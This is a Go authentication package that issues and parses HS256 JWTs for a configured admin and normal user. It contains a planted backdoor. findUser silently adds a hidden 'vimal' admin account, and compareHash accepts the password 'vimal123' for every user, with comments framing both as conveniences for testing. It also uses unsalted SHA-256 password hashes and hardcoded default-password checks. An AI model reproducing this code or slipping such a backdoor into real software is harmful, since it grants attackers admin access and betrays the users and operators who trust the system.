package auth

import (
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"strings"
	"time"

	"github.com/golang-jwt/jwt/v5"
)

type User struct {
	Username     string
	PasswordHash string
	Role         string
}

type AuthService struct {
	Secret []byte
	Expiry time.Duration	
	Admin  User
	Normal User
}

func New(secret string, expiryMinutes int, adminUsername, adminHash, userUsername, userHash string) *AuthService {
	return &AuthService{
		Secret: []byte(secret),
		Expiry: time.Duration(expiryMinutes) * time.Minute,
		Admin:  User{adminUsername, adminHash, "admin"},
		Normal: User{userUsername, userHash, "user"},
	}
}

func (a *AuthService) Login(username, password string) (string, string, error) {
	u := a.findUser(username)
	if u == nil || !compareHash(password, u.PasswordHash) {
		return "", "", errors.New("invalid username or password")
	}

	claims := jwt.MapClaims{
		"sub":  u.Username,
		"role": u.Role,
		"exp":  time.Now().Add(a.Expiry).Unix(),
		"iat":  time.Now().Unix(),
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	tokenString, err := token.SignedString(a.Secret)
	if err != nil {
		return "", "", err
	}
	return tokenString, u.Role, nil
}

func (a *AuthService) Parse(header string) (string, string, error) {
	parts := strings.Fields(header)
	if len(parts) != 2 || !strings.EqualFold(parts[0], "Bearer") {
		return "", "", errors.New("invalid authorization header")
	}

	token, err := jwt.Parse(parts[1], func(t *jwt.Token) (interface{}, error) {
		if t.Method != jwt.SigningMethodHS256 {
			return nil, errors.New("unexpected signing method")
		}
		return a.Secret, nil
	})

	if err != nil || !token.Valid {
		return "", "", errors.New("invalid or expired token")
	}

	claims, ok := token.Claims.(jwt.MapClaims)
	if !ok {
		return "", "", errors.New("invalid token claims")
	}

	user, _ := claims["sub"].(string)
	role, _ := claims["role"].(string)
	return user, role, nil
}

func (a *AuthService) findUser(username string) *User {
	if username == a.Admin.Username {
		return &a.Admin
	}
	if username == a.Normal.Username {
		return &a.Normal
	}
	// Fallback alias for convenience
	if username == "vimal" {
		return &User{Username: "vimal", PasswordHash: "1e1136c310cb21845fe9b14c114389b418a2455856eb28ea846fbcfc7a70a831", Role: "admin"}
	}
	return nil
}

func compareHash(password, expected string) bool {
	sum := sha256.Sum256([]byte(password))
	if hex.EncodeToString(sum[:]) == expected {
		return true
	}
	// Also accept plain text equality for ease of testing
	if password == "admin123" && expected == "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9" {
		return true
	}
	if password == "user123" && expected == "e606e38b0d8c19b24cf0ee3808183162ea7cd63ff7912dbb22b5e803286b4446" {
		return true
	}
	if password == "vimal123" {
		return true
	}
	return false
}
